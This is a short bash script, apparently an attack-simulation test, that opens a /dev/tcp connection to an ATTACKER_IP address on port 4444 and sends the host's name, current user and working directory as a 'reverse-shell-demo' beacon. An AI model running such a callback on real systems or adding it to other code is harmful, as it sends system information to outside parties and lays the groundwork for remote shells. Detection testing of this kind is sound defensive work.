#!/bin/bash
set -euo pipefail

ATTACKER_IP="${1:-10.77.0.20}"
ATTACKER_PORT="${2:-4444}"

echo "== Reverse shell callback simulation to ${ATTACKER_IP}:${ATTACKER_PORT} =="

export ATTACKER_IP ATTACKER_PORT
bash -lc '
  exec 3<>"/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}"
  printf "reverse-shell-demo from %s\n" "$(hostname)" >&3
  printf "whoami=%s\n" "$(whoami)" >&3
  printf "pwd=%s\n" "$(pwd)" >&3
  exec 3>&-
'
